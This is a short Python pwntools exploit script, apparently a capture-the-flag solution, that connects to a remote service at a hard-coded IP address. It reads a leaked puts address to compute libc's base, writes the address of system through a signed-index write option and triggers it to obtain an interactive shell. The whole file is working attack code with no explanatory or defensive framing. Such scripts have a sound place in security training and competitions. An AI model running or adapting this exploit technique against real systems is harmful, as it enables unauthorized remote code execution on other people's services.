from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6")

p = remote("134.112.58.12",31338)
p.sendlineafter(b"> ", b"2")
line = p.recvline()
puts_leak = int(line.split(b"reporter = ")[1], 16)
libc.address = puts_leak - libc.sym["puts"]
system = libc.sym["system"]
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"line (signed index): ", b"8")
p.sendlineafter(b"value: ", str(system).encode())

p.sendlineafter(b"> ", b"3")

p.interactive()